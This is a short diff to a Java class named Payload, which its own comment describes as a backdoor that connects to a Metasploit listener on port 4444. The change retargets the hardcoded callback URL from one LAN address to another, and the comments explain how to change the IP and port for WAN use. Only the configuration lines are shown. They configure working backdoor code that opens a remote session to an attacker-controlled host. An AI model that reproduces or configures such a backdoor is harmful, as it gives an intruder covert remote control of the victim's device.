@@ -22,7 +22,7 @@ public class Payload {
     //USAGE NOTE: this backdoor works in a LAN, with Metasploit listening to port 4444, the machine has ip 192.168.178.30
     //if you wish to modify ip:port (e.g. for a WAN usage, or a different Metasploit machine with different IP)
     // you can modify the following variable (URL), please DO NOT remove the four 'Z' at the beginning
-    public static final String URL = "ZZZZtcp://192.168.178.30:4444                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
+    public static final String URL = "ZZZZtcp://192.168.0.15:4444                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
     public static long comm_timeout;
     private static String[] parameters;
     public static long retry_total;
